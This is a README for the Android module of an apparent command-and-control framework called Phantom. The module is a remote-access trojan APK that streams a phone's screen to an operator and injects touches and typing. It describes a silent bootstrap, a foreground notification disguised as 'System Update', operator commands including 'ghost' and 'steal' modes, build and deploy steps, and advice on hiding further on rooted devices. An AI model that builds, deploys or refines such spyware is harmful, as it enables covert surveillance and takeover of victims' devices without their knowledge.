# Phantom Remote Session — Android

The Android port of the desktop Remote Session module (`payloads/remote/`).
It gives the same capability — live screen view + input control — on a phone
or tablet, using the same C2 channel and the same `REMOTE_FRAME_B64:` frames,
so it renders in the **same** Electron canvas / C2 shell live view.

## Why an APK and not a plain binary?

The desktop module is a single PE/ELF because Windows has Win32 (`BitBlt`,
`SendInput`) and Linux has X11. **Android has no equivalent public API** for a
normal app:

| Capability | Android API | Constraint |
|-----------|-------------|------------|
| Screen capture | `MediaProjection` + `VirtualDisplay`/`ImageReader` | one-time user consent dialog |
| Input injection | `AccessibilityService` (`dispatchGesture`) | user must enable the service |
| Screen capture (alt) | `AccessibilityService.takeScreenshot` (API 30+) | same enable |
| Raw capture/inject | `/dev/graphics/fb0`, `/dev/input/*` | **root only** on all modern devices |

So the module is an APK with:

- `MainActivity` — silent bootstrap; shows the system projection consent dialog.
- `RemoteService` — foreground service; owns the `MediaProjection`, captures
  JPEG frames, polls the C2 and dispatches tasks.
- `RemoteAccessibilityService` — the input primitive (`tap`, `swipe`, `text`,
  `key BACK/HOME/RECENTS`).
- `native_bridge.cpp` (JNI) — reuses `remote_net.h` for transport, AES-256-GCM
  crypto and the per-beacon HMAC identity, so the module is wire-compatible
  with the desktop module and the beacon.

## iOS

**Not supported, and not planned.** iOS has no `MediaProjection` and no
user-enableable input-injection API at all; a third-party app cannot capture
the screen or inject touch without a jailbreak plus private frameworks. This
is an OS design limit, not a Phantom limitation.

## Build

```bash
# Requires Android SDK + NDK; OpenSSL-for-Android is cross-compiled by
# phantom/utils/build_helper.py (_install_openssl_android), same as the beacon.
export ANDROID_NDK_HOME=/opt/android-ndk
cd payloads/remote/android
./gradlew assembleRelease
# -> app/build/outputs/apk/release/app-release.apk
```

Phantom's builder (`phantom/utils/builder.py: compile_remote`) runs this for
you when the SDK is present:

```
phantom --remote-deploy android        # or: use payload → remote → android
```

## Commands (queued from the C2 like any beacon task)

| Command | Behaviour |
|---------|-----------|
| `remote start [quality]` | start streaming frames on the task cadence |
| `remote live [interval_ms] [quality]` | fast cadence until `remote stop` |
| `remote stop` | stop streaming |
| `remote frame [quality]` | capture one frame now |
| `remote mode interactive\|ghost\|steal` | ghost = silent (no stream); Android has no hidden desktop |
| `remote launch <package>` | launch an app by package name (optional bootstrap) |
| `exit` | terminate the module |

### Not a command: `remote input`

`remote input <tap|swipe|text|key> ...` is **not an operator command** and you
never type it. It is the in-band primitive the Electron canvas calls when you
touch the streamed image: tap = a click, swipe = a drag, text = what you type.
You get control with `remote start` and just use the canvas — exactly like the
desktop module.

## Packet size note

Frames are JPEG-compressed at the requested quality before base64, then
encrypted. On a metered mobile link use `remote frame 30` rather than `remote
live` to keep the beacon-cadence traffic small.

## Detection surface

The module is a normal APK with a foreground "System Update" notification and
a visible accessibility entry — both are unavoidable on non-rooted Android
(the OS requires them for capture and injection) and are documented in the
README so operators know what the target will see. On a rooted device the
accessibility step can be granted via `su` and the notification minimized.
